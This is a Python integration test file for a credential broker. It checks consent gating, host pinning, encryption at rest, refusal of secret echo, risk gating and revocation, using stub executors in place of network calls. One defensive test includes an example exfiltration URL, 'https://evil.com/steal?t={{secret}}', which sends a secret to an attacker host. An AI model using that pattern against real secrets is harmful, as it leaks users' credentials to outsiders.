"""Integration tests for the secure credential broker core.

Locks the security guarantees the design committed to:

  * non-exposure   — the secret value never lands in plaintext on disk
                     (secrets.enc is ciphertext), in consent files, in the
                     audit log, in the returned result, or in os.environ.
  * consent-integrity — execute takes ONLY a consent_id; it runs the
                     broker's stored descriptor; not-approved/revoked/expired
                     consents are refused.
  * confinement / pinning — off-pin hosts are rejected at request time;
                     execute hits the host from the stored descriptor, never
                     a caller-supplied one.
  * anti-deception — computed sink derives from the spec; label/host
                     mismatch is flagged.
  * output-echo    — a result containing the secret is refused (fail-closed),
                     for body, stderr, and error.
  * risk-gate      — low-risk rides the window; high-risk needs presence.
  * revoke         — a revoked consent refuses; revoke/acquire is atomic.

No claude CLI, no network: the http executor is replaced by a capturing
stub so we can assert what the broker WOULD send without leaving the box.

Run:
    cd backend && BETTER_CLAUDE_TEST_PRESENCE=allow .venv/bin/python scripts/test_credential_broker.py
"""

from __future__ import annotations

import json
import os
import shutil
import sys
import tempfile

import _test_home
_TMP_HOME = _test_home.isolate("bc-test-cred-broker-")
os.environ.setdefault("BETTER_CLAUDE_TEST_PRESENCE", "allow")

_HERE = os.path.dirname(os.path.abspath(__file__))
_BACKEND = os.path.dirname(_HERE)
if _BACKEND not in sys.path:
    sys.path.insert(0, _BACKEND)

from credential_broker import (  # noqa: E402
    audit,
    broker,
    consent_store,
    secret_store,
)
from credential_broker import executors as ex_mod  # noqa: E402
from credential_broker.executors.base import ExecResult  # noqa: E402
from credential_broker.executors.exec import ExecSinkExecutor  # noqa: E402
from credential_broker.sink_resolver import resolve  # noqa: E402
from credential_broker.descriptor import DescriptorError, validate  # noqa: E402
import password_manager  # noqa: E402

SECRET = "sk-SUPERSECRET-abc123-do-not-leak"
APP_SID = "app-session-1"


class _CapturingExecutor:
    kind = "http"

    def __init__(self):
        self.last_url = None
        self.last_secret_seen = None
        self.reply = ExecResult(ok=True, status=200, body="OK")

    def execute(self, descriptor, secret):
        # Substitute exactly as the real executor would, so we can assert the
        # destination + that the secret was injected — without any network.
        secrets = secret if isinstance(secret, dict) else {"secret": secret}
        url = descriptor["sink"]["url_template"]
        for name, value in secrets.items():
            url = url.replace(f"{{{{secret:{name}}}}}", value)
        if "secret" in secrets:
            url = url.replace("{{secret}}", secrets["secret"])
        self.last_url = url
        self.last_secret_seen = secret
        return self.reply


def _install_capturing() -> _CapturingExecutor:
    cap = _CapturingExecutor()
    ex_mod._REGISTRY["http"] = cap
    return cap


class _CapturingKeychainExecutor:
    kind = "local_keychain"

    def __init__(self):
        self.calls = []

    def execute(self, descriptor, secret):
        secrets = secret if isinstance(secret, dict) else {"secret": secret}
        self.calls.append((descriptor["sink"]["service"], descriptor["sink"]["account"], secrets["secret"]))
        return ExecResult(ok=True, body="stored")


def _install_keychain_capturing() -> _CapturingKeychainExecutor:
    cap = _CapturingKeychainExecutor()
    ex_mod._REGISTRY["local_keychain"] = cap
    return cap


class _CapturingExecExecutor:
    kind = "exec"

    def __init__(self):
        self.last_argv = None
        self.last_stdin = None
        self.last_secret_seen = None
        self.reply = ExecResult(ok=True, status=0, body="OK")

    def execute(self, descriptor, secret):
        secrets = secret if isinstance(secret, dict) else {"secret": secret}
        self.last_argv = list(descriptor["sink"]["argv"])
        self.last_stdin = descriptor["sink"]["stdin_template"]
        for name, value in secrets.items():
            self.last_stdin = self.last_stdin.replace(f"{{{{secret:{name}}}}}", value)
        if "secret" in secrets:
            self.last_stdin = self.last_stdin.replace("{{secret}}", secrets["secret"])
        self.last_secret_seen = secret
        return self.reply


def _install_exec_capturing() -> _CapturingExecExecutor:
    cap = _CapturingExecExecutor()
    ex_mod._REGISTRY["exec"] = cap
    return cap


def _descriptor(*, label, url, method="GET", headers=None):
    return {
        "provider_id": "prov-github",
        "label": label,
        "sink_kind": "http",
        "sink": {
            "method": method,
            "url_template": url,
            "headers": headers or {"Authorization": "Bearer {{secret}}"},
        },
    }


def _keychain_descriptor(*, service="testape", account="login.password"):
    return {
        "provider_id": "prov-testape",
        "label": f"Store {account} for {service}",
        "sink_kind": "local_keychain",
        "sink": {
            "service": service,
            "account": account,
        },
    }


def _exec_descriptor(*, argv=None, stdin_template="token={{secret}}", timeout_s=30):
    return {
        "provider_id": "prov-local",
        "label": "Local exec",
        "sink_kind": "exec",
        "sink": {
            "argv": argv or ["/bin/cat"],
            "stdin_template": stdin_template,
            "timeout_s": timeout_s,
        },
    }


def _approve_and_get_id(public_view, *, secret_value=SECRET) -> str:
    cid = public_view["consent_id"]
    rec, reason = broker.approve_consent(cid, secret_value=secret_value)
    assert reason == "ok", f"approve failed: {reason}"
    return cid


def _approve_many_and_get_id(public_view, secret_values: dict[str, str]) -> str:
    cid = public_view["consent_id"]
    rec, reason = broker.approve_consent(cid, secret_values=secret_values)
    assert reason == "ok", f"approve failed: {reason}"
    return cid


def _install_password_manager_values(values: dict[tuple[str, str], str]):
    import oskeychain

    real_get = oskeychain.get
    index = [
        {"service": service, "account": account}
        for service, account in values
    ]
    indexed_values = dict(values)
    indexed_values[(password_manager.INDEX_SERVICE, password_manager.INDEX_ACCOUNT)] = json.dumps(index)
    oskeychain.get = lambda service, account: indexed_values.get((service, account))
    return oskeychain, real_get


# ── tests ────────────────────────────────────────────────────────────────


def test_anti_deception_and_pinning():
    # label claims github but URL points at evil.com → mismatch flagged
    norm = validate(
        _descriptor(
            label="GitHub api.github.com token",
            url="https://evil.com/steal?t={{secret}}",
        )
    )
    info = resolve(norm)
    assert info.computed_host == "evil.com"
    assert info.label_mismatch is True, "label/host mismatch must be flagged"

    # off-pin host rejected at request time (never becomes a pending consent)
    try:
        broker.request_consent(
            app_session_id=APP_SID,
            descriptor_raw=_descriptor(
                label="x", url="https://evil.com/x?t={{secret}}"
            ),
            allowed_sinks=["api.github.com"],
        )
        raise AssertionError("off-pin request should have been rejected")
    except broker.BrokerError:
        pass
    assert consent_store.list_pending() == [], "rejected request must not persist"
    print("ok  anti-deception + pinning")


def test_consent_integrity_and_confinement():
    _install_capturing()
    pv = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=_descriptor(
            label="github",
            url="https://api.github.com/user?t={{secret}}",
        ),
        allowed_sinks=["api.github.com"],
    )
    cid = pv["consent_id"]

    # not approved yet → execute refused
    try:
        broker.execute(cid)
        raise AssertionError("execute before approve must refuse")
    except broker.BrokerError:
        pass

    broker.approve_consent(cid, secret_value=SECRET)
    cap = _install_capturing()
    res = broker.execute(cid)
    assert res["ok"] is True
    # confinement: destination is the stored descriptor's host, and the
    # secret was injected by the broker (caller never supplied either).
    assert cap.last_url.startswith("https://api.github.com/user"), cap.last_url
    assert cap.last_secret_seen["secret"] == SECRET
    print("ok  consent-integrity + confinement")


def test_named_multi_secret_http_injection():
    cap = _install_capturing()
    descriptor = _descriptor(
        label="github",
        url="https://api.github.com/user?t={{secret:token}}",
        headers={"X-Account": "{{secret:account}}"},
    )
    norm = validate(descriptor)
    assert norm["secret_names"] == ["account", "token"]
    pv = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=descriptor,
        allowed_sinks=["api.github.com"],
    )
    cid = _approve_many_and_get_id(
        pv,
        {"token": "tok-value", "account": "acct-value"},
    )
    res = broker.execute(cid)
    assert res["ok"] is True
    assert cap.last_url == "https://api.github.com/user?t=tok-value"
    assert cap.last_secret_seen == {"account": "acct-value", "token": "tok-value"}
    print("ok  named multi-secret http injection")


def test_local_keychain_sink_stores_without_egress():
    cap = _install_keychain_capturing()
    pv = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=_keychain_descriptor(),
        allowed_sinks=["local-keychain:testape"],
    )
    assert pv["sink"]["sink_kind"] == "local_keychain"
    assert pv["sink"]["computed_host"] == "local-keychain:testape"
    assert pv["sink"]["computed_target"] == "local keychain: testape/login.password"
    assert pv["sink"]["egress"] is False
    assert pv["sink"]["risk"] == "low"
    cid = _approve_and_get_id(pv)
    res = broker.execute(cid)
    assert res["ok"] is True
    assert cap.calls == [("testape", "login.password", SECRET)]
    print("ok  local-keychain sink stores without egress")


def test_local_keychain_executor_cross_platform():
    import keyring

    import oskeychain
    from credential_broker.executors.local_keychain import LocalKeychainExecutor

    ex = LocalKeychainExecutor()
    desc = _keychain_descriptor()
    real_platform = sys.platform

    # non-darwin → python keyring (Windows Credential Manager / Secret Service)
    kr_calls = []
    real_set = keyring.set_password
    sys.platform = "linux"
    keyring.set_password = lambda *a: kr_calls.append(a)
    try:
        res = ex.execute(desc, SECRET)
    finally:
        sys.platform, keyring.set_password = real_platform, real_set
    assert res.ok is True and res.body == "stored"
    assert kr_calls == [("testape", "login.password", SECRET)]

    # darwin writes through Keyring so plaintext never appears in process argv.
    darwin_calls = []
    sys.platform = "darwin"
    keyring.set_password = lambda *args: darwin_calls.append(args)
    try:
        res = ex.execute(desc, SECRET)
    finally:
        sys.platform, keyring.set_password = real_platform, real_set
    assert res.ok is True
    assert darwin_calls == [("testape", "login.password", SECRET)]

    # store failure → ok=False, secret-free error
    real_store = oskeychain.store
    def _boom(*a):
        raise RuntimeError("locked")
    oskeychain.store = _boom
    try:
        res = ex.execute(desc, SECRET)
    finally:
        oskeychain.store = real_store
    assert res.ok is False
    assert SECRET not in res.error
    print("ok  local-keychain executor routes per platform")


def test_macos_keychain_read_distinguishes_missing_from_denied():
    import oskeychain

    real_platform = sys.platform
    real_run = oskeychain.subprocess.run

    class _Result:
        stdout = "sensitive-output"

        def __init__(self, returncode):
            self.returncode = returncode

    sys.platform = "darwin"
    try:
        oskeychain.subprocess.run = lambda *args, **kwargs: _Result(44)
        assert oskeychain.get("service", "missing") is None

        oskeychain.subprocess.run = lambda *args, **kwargs: _Result(1)
        try:
            oskeychain.get("service", "denied")
        except RuntimeError as exc:
            assert "sensitive" not in str(exc)
        else:
            raise AssertionError("denied keychain read must fail")
    finally:
        sys.platform = real_platform
        oskeychain.subprocess.run = real_run


def test_exec_secret_via_stdin_and_env_scrubbed():
    cap = _install_exec_capturing()
    pv = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=_exec_descriptor(argv=["/bin/cat", "--"]),
        allowed_sinks=["exec:/bin/cat"],
    )
    assert pv["sink"]["sink_kind"] == "exec"
    assert pv["sink"]["computed_host"] == "exec:/bin/cat"
    assert pv["sink"]["computed_target"] == "/bin/cat --"
    assert pv["sink"]["egress"] is True
    assert pv["sink"]["risk"] == "high"
    cid = _approve_and_get_id(pv)
    res = broker.execute(cid)
    assert res["ok"] is True
    assert cap.last_argv == ["/bin/cat", "--"]
    assert SECRET not in json.dumps(cap.last_argv)
    assert cap.last_stdin == f"token={SECRET}"
    assert cap.last_secret_seen["secret"] == SECRET

    cat_res = ExecSinkExecutor().execute(
        validate(_exec_descriptor(argv=["/bin/cat"], stdin_template="cat {{secret}}")),
        SECRET,
    )
    assert cat_res.ok is True
    assert cat_res.body == f"cat {SECRET}"
    assert cat_res.stderr == ""

    env_before = dict(os.environ)
    os.environ["BA_EXEC_SECRET_TEST"] = f"prefix-{SECRET}-suffix"
    script = (
        "import os,sys; "
        "s=sys.stdin.read(); "
        "secret=s.removeprefix('real '); "
        "print(('stdin=yes' if secret in s else 'stdin=no') + ' ' + "
        "('env=leak' if any(secret in v for v in os.environ.values()) else 'env=clean'))"
    )
    try:
        env_res = ExecSinkExecutor().execute(
            validate(
                _exec_descriptor(
                    argv=[sys.executable, "-c", script],
                    stdin_template="real {{secret}}",
                )
            ),
            SECRET,
        )
    finally:
        os.environ.clear()
        os.environ.update(env_before)
    assert env_res.ok is True
    assert env_res.body.strip() == "stdin=yes env=clean"
    assert SECRET not in env_res.body
    print("ok  exec stdin injection + argv/env confinement")


def test_named_multi_secret_exec_injection_and_storage():
    cap = _install_exec_capturing()
    descriptor = _exec_descriptor(
        argv=["/bin/cat"],
        stdin_template=(
            "host={{secret:sftp.host}}\n"
            "user={{secret:sftp.user}}\n"
            "pass={{secret:sftp.pass}}\n"
        ),
    )
    norm = validate(descriptor)
    assert norm["secret_names"] == ["sftp.host", "sftp.pass", "sftp.user"]
    pv = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=descriptor,
        allowed_sinks=["exec:/bin/cat"],
    )
    assert pv["secret_names"] == ["sftp.host", "sftp.pass", "sftp.user"]
    secrets = {
        "sftp.host": "example.invalid",
        "sftp.user": "deploy-user",
        "sftp.pass": "deploy-pass",
    }
    cid = _approve_many_and_get_id(pv, secrets)
    rec = consent_store.get(cid)
    assert rec["secret_ref"] is None
    assert sorted(rec["secret_refs"]) == ["sftp.host", "sftp.pass", "sftp.user"]
    for value in secrets.values():
        assert value not in json.dumps(rec)

    res = broker.execute(cid)
    assert res["ok"] is True
    assert "host=example.invalid" in cap.last_stdin
    assert "user=deploy-user" in cap.last_stdin
    assert "pass=deploy-pass" in cap.last_stdin
    print("ok  named multi-secret exec injection + storage")


def test_stored_password_manager_sources_approve_without_user_secret_values():
    cap = _install_exec_capturing()
    oskeychain, real_get = _install_password_manager_values({
        ("ofekdev", "sftp.host"): "example.invalid",
        ("ofekdev", "sftp.user"): "deploy-user",
        ("ofekdev", "sftp.pass"): "deploy-pass",
    })
    try:
        descriptor = _exec_descriptor(
            argv=["/bin/cat"],
            stdin_template=(
                "host={{secret:sftp.host}}\n"
                "user={{secret:sftp.user}}\n"
                "pass={{secret:sftp.pass}}\n"
            ),
        )
        descriptor["secret_sources"] = {
            "sftp.host": {
                "kind": "password_manager",
                "service": "ofekdev",
                "account": "sftp.host",
            },
            "sftp.user": {
                "kind": "password_manager",
                "service": "ofekdev",
                "account": "sftp.user",
            },
            "sftp.pass": {
                "kind": "password_manager",
                "service": "ofekdev",
                "account": "sftp.pass",
            },
        }
        pv = broker.request_consent(
            app_session_id=APP_SID,
            descriptor_raw=descriptor,
            allowed_sinks=["exec:/bin/cat"],
        )
        assert pv["secret_sources"]["sftp.pass"] == {
            "kind": "password_manager",
            "service": "ofekdev",
            "account": "sftp.pass",
        }
        cid = pv["consent_id"]
        rec, reason = broker.approve_consent(cid)
        assert reason == "ok", f"approve failed: {reason}"
        assert sorted(rec["secret_refs"]) == ["sftp.host", "sftp.pass", "sftp.user"]
        for value in ("example.invalid", "deploy-user", "deploy-pass"):
            assert value not in json.dumps(rec)

        res = broker.execute(cid)
        assert res["ok"] is True
        assert "host=example.invalid" in cap.last_stdin
        assert "user=deploy-user" in cap.last_stdin
        assert "pass=deploy-pass" in cap.last_stdin
    finally:
        oskeychain.get = real_get
    print("ok  stored password-manager sources approve without user-entered secrets")


def test_stored_password_manager_sources_fail_closed_when_missing_or_unmatched():
    oskeychain, real_get = _install_password_manager_values({
        ("ofekdev", "sftp.host"): "example.invalid",
    })
    try:
        descriptor = _exec_descriptor(
            argv=["/bin/cat"],
            stdin_template="host={{secret:sftp.host}}\npass={{secret:sftp.pass}}\n",
        )
        descriptor["secret_sources"] = {
            "sftp.host": {
                "kind": "password_manager",
                "service": "ofekdev",
                "account": "sftp.host",
            },
            "sftp.pass": {
                "kind": "password_manager",
                "service": "ofekdev",
                "account": "sftp.pass",
            },
        }
        try:
            broker.request_consent(
                app_session_id=APP_SID,
                descriptor_raw=descriptor,
                allowed_sinks=["exec:/bin/cat"],
            )
            raise AssertionError("missing stored password was accepted")
        except broker.BrokerError as e:
            assert str(e) == "stored secret 'sftp.pass' was not found"

        bad = _exec_descriptor(
            argv=["/bin/cat"],
            stdin_template="host={{secret:sftp.host}}\n",
        )
        bad["secret_sources"] = {
            "sftp.pass": {
                "kind": "password_manager",
                "service": "ofekdev",
                "account": "sftp.pass",
            },
        }
        try:
            validate(bad)
            raise AssertionError("unmatched stored source was accepted")
        except DescriptorError as e:
            assert str(e) == "secret source 'sftp.pass' has no matching placeholder"
    finally:
        oskeychain.get = real_get
    print("ok  stored password-manager sources fail closed")


def test_named_multi_secret_approval_requires_exact_names():
    pv = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=_exec_descriptor(
            argv=["/bin/cat"],
            stdin_template="{{secret:first}} {{secret:second}}",
        ),
        allowed_sinks=["exec:/bin/cat"],
    )
    try:
        broker.approve_consent(pv["consent_id"], secret_values={"first": "x"})
        raise AssertionError("missing named secret should be rejected")
    except broker.BrokerError as e:
        assert "missing secrets: second" in str(e)
    try:
        broker.approve_consent(
            pv["consent_id"],
            secret_values={"first": "x", "second": "y", "third": "z"},
        )
        raise AssertionError("extra named secret should be rejected")
    except broker.BrokerError as e:
        assert "unexpected secrets: third" in str(e)
    assert consent_store.get(pv["consent_id"])["status"] == "pending"
    print("ok  named multi-secret approval requires exact names")


def test_exec_rejects_secret_in_argv():
    try:
        validate(_exec_descriptor(argv=["/bin/cat", "{{secret:sftp.pass}}"]))
        raise AssertionError("exec argv must not allow {{secret}}")
    except DescriptorError:
        pass
    print("ok  exec rejects secret placeholder in argv")


def test_exec_off_pin_rejected_without_persisting():
    before = consent_store.list_pending()
    try:
        broker.request_consent(
            app_session_id=APP_SID,
            descriptor_raw=_exec_descriptor(argv=["/bin/cat"]),
            allowed_sinks=["exec:/bin/echo"],
        )
        raise AssertionError("off-pin exec request should have been rejected")
    except broker.BrokerError:
        pass
    assert consent_store.list_pending() == before, "rejected exec request must not persist"
    print("ok  exec off-pin rejected without persistence")


def test_off_pin_stored_sources_do_not_probe_password_manager():
    import oskeychain

    real_get = oskeychain.get
    oskeychain.get = lambda service, account: (_ for _ in ()).throw(
        AssertionError("password manager was probed before sink pinning")
    )
    try:
        descriptor = _exec_descriptor(
            argv=["/bin/cat"],
            stdin_template="pass={{secret:sftp.pass}}\n",
        )
        descriptor["secret_sources"] = {
            "sftp.pass": {
                "kind": "password_manager",
                "service": "ofekdev",
                "account": "sftp.pass",
            },
        }
        try:
            broker.request_consent(
                app_session_id=APP_SID,
                descriptor_raw=descriptor,
                allowed_sinks=["exec:/bin/echo"],
            )
            raise AssertionError("off-pin stored-source descriptor was accepted")
        except broker.BrokerError as e:
            assert "allowed_sinks" in str(e)
    finally:
        oskeychain.get = real_get
    print("ok  off-pin stored sources do not probe password manager")


def test_exec_output_echo_refused():
    pv = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=_exec_descriptor(argv=["/bin/cat"], stdin_template="{{secret}}"),
        allowed_sinks=["exec:/bin/cat"],
    )
    cid = _approve_and_get_id(pv)
    ex_mod._REGISTRY["exec"] = ExecSinkExecutor()
    try:
        broker.execute(cid)
        raise AssertionError("exec stdout echoing the secret must be refused")
    except broker.BrokerError as e:
        assert SECRET not in str(e)
    print("ok  exec stdout echo refused")


def test_exec_exit_code_and_timeout_mapping():
    ex = ExecSinkExecutor()
    fail_res = ex.execute(
        validate(
            _exec_descriptor(
                argv=[sys.executable, "-c", "import sys; sys.stderr.write('bad'); sys.exit(7)"],
                stdin_template="{{secret}}",
            )
        ),
        SECRET,
    )
    assert fail_res.ok is False
    assert fail_res.status == 7
    assert fail_res.stderr == "bad"
    assert SECRET not in fail_res.error

    timeout_res = ex.execute(
        validate(
            _exec_descriptor(
                argv=[sys.executable, "-c", "import time; time.sleep(2)"],
                stdin_template="{{secret}}",
                timeout_s=1,
            )
        ),
        SECRET,
    )
    assert timeout_res.ok is False
    assert timeout_res.status is None
    assert "timed out" in timeout_res.error
    assert SECRET not in timeout_res.error
    print("ok  exec exit-code + timeout mapping")


def test_exec_execute_preserves_parent_environ():
    env_before = dict(os.environ)
    pv = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=_exec_descriptor(
            argv=[sys.executable, "-c", ""],
            stdin_template="{{secret}}",
        ),
        allowed_sinks=[f"exec:{sys.executable}"],
    )
    cid = _approve_and_get_id(pv)
    ex_mod._REGISTRY["exec"] = ExecSinkExecutor()
    res = broker.execute(cid)
    assert res["ok"] is True
    assert os.environ == env_before
    print("ok  exec execute preserves os.environ")


def test_output_echo_refused():
    pv = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=_descriptor(
            label="github",
            url="https://api.github.com/echo?t={{secret}}",
        ),
        allowed_sinks=["api.github.com"],
    )
    cid = _approve_and_get_id(pv)

    for field_kw in ("body", "stderr", "error"):
        cap = _install_capturing()
        cap.reply = ExecResult(ok=True, status=200, **{field_kw: f"leaked={SECRET}"})
        try:
            broker.execute(cid)
            raise AssertionError(f"echo via {field_kw} must be refused")
        except broker.BrokerError as e:
            assert SECRET not in str(e), "refusal message must not echo the secret"
    print("ok  output-echo refused (body/stderr/error)")


def test_multi_secret_output_echo_refused():
    pv = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=_exec_descriptor(
            argv=["/bin/cat"],
            stdin_template="{{secret:first}}\n{{secret:second}}",
        ),
        allowed_sinks=["exec:/bin/cat"],
    )
    cid = _approve_many_and_get_id(
        pv,
        {"first": "first-secret", "second": "second-secret"},
    )
    cap = _install_exec_capturing()
    cap.reply = ExecResult(ok=True, status=0, body="second-secret")
    try:
        broker.execute(cid)
        raise AssertionError("echo of any named secret must be refused")
    except broker.BrokerError as e:
        assert "second-secret" not in str(e)
    print("ok  multi-secret output echo refused")


def test_risk_gate():
    # high-risk: POST
    pv_hi = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=_descriptor(
            label="github",
            url="https://api.github.com/issues?t={{secret}}",
            method="POST",
        ),
        allowed_sinks=["api.github.com"],
    )
    assert pv_hi["sink"]["risk"] == "high"
    cid_hi = _approve_and_get_id(pv_hi)

    # low-risk: GET
    pv_lo = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=_descriptor(
            label="github",
            url="https://api.github.com/user?t={{secret}}",
            method="GET",
        ),
        allowed_sinks=["api.github.com"],
    )
    assert pv_lo["sink"]["risk"] == "low"
    cid_lo = _approve_and_get_id(pv_lo)

    _install_capturing()
    os.environ["BETTER_CLAUDE_TEST_PRESENCE"] = "window-only"
    try:
        # low-risk rides the window
        assert broker.execute(cid_lo)["ok"] is True
        # high-risk denied without a presence proof
        try:
            broker.execute(cid_hi)
            raise AssertionError("high-risk must require presence")
        except broker.BrokerError:
            pass
    finally:
        os.environ["BETTER_CLAUDE_TEST_PRESENCE"] = "allow"
    print("ok  risk-gate (low rides window, high needs presence)")


def test_revoke():
    _install_capturing()
    pv = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=_descriptor(
            label="github",
            url="https://api.github.com/user?t={{secret}}",
        ),
        allowed_sinks=["api.github.com"],
    )
    cid = _approve_and_get_id(pv)
    assert broker.execute(cid)["ok"] is True  # works before revoke

    rec, reason = broker.revoke_consent(cid)
    assert reason == "ok"
    # acquire_for_execute is the atomic gate; after revoke it must refuse
    _, areason = consent_store.acquire_for_execute(cid)
    assert areason == "revoked", areason
    try:
        broker.execute(cid)
        raise AssertionError("revoked consent must refuse execute")
    except broker.BrokerError:
        pass
    print("ok  revoke (atomic acquire refuses)")


def test_non_exposure():
    env_before = dict(os.environ)
    cap = _install_capturing()
    pv = broker.request_consent(
        app_session_id=APP_SID,
        descriptor_raw=_descriptor(
            label="github",
            url="https://api.github.com/user?t={{secret}}",
        ),
        allowed_sinks=["api.github.com"],
    )
    cid = _approve_and_get_id(pv)
    ref = consent_store.get(cid)["secret_refs"]["secret"]  # bound at approval
    res = broker.execute(cid)

    # 1. result returned to the caller carries no secret
    assert SECRET not in json.dumps(res)
    # 2. public consent view carries no secret
    assert SECRET not in json.dumps(pv)
    assert SECRET not in json.dumps(consent_store.public_view(consent_store.get(cid)))

    # 3. encrypted-at-rest: secrets.enc exists and is NOT plaintext
    enc = secret_store._path()
    assert enc.exists()
    raw = enc.read_bytes()
    assert SECRET.encode() not in raw, "secret must be ciphertext on disk"
    # but it round-trips through the key provider
    from credential_broker import presence

    assert secret_store.read_secret(ref, presence.get_key_provider()) == SECRET

    # 4. consent files on disk carry no secret
    for p in (secret_store._dir() / "consents").glob("*.json"):
        assert SECRET not in p.read_text()
    # 5. audit log carries no secret
    if audit._path().exists():
        assert SECRET not in audit._path().read_text()
    # 6. no secret leaked into the process environment
    assert os.environ == env_before, "execute must not mutate os.environ"
    for v in os.environ.values():
        assert SECRET not in v
    # capturing executor confirms the broker did inject it (in-memory only)
    assert cap.last_secret_seen["secret"] == SECRET
    print("ok  non-exposure (disk/result/view/audit/env all clean)")


def _run_all():
    tests = [
        test_anti_deception_and_pinning,
        test_consent_integrity_and_confinement,
        test_named_multi_secret_http_injection,
        test_local_keychain_sink_stores_without_egress,
        test_local_keychain_executor_cross_platform,
        test_macos_keychain_read_distinguishes_missing_from_denied,
        test_exec_secret_via_stdin_and_env_scrubbed,
        test_named_multi_secret_exec_injection_and_storage,
        test_stored_password_manager_sources_approve_without_user_secret_values,
        test_stored_password_manager_sources_fail_closed_when_missing_or_unmatched,
        test_named_multi_secret_approval_requires_exact_names,
        test_exec_rejects_secret_in_argv,
        test_exec_off_pin_rejected_without_persisting,
        test_off_pin_stored_sources_do_not_probe_password_manager,
        test_exec_output_echo_refused,
        test_exec_exit_code_and_timeout_mapping,
        test_exec_execute_preserves_parent_environ,
        test_output_echo_refused,
        test_multi_secret_output_echo_refused,
        test_risk_gate,
        test_revoke,
        test_non_exposure,
    ]
    failed = 0
    for t in tests:
        try:
            t()
        except Exception as e:  # noqa: BLE001
            failed += 1
            print(f"FAIL {t.__name__}: {e}")
            import traceback

            traceback.print_exc()
    return failed


if __name__ == "__main__":
    try:
        rc = _run_all()
    finally:
        shutil.rmtree(_TMP_HOME, ignore_errors=True)
    if rc:
        print(f"\n{rc} test(s) failed")
        sys.exit(1)
    print("\nall credential-broker core tests passed")
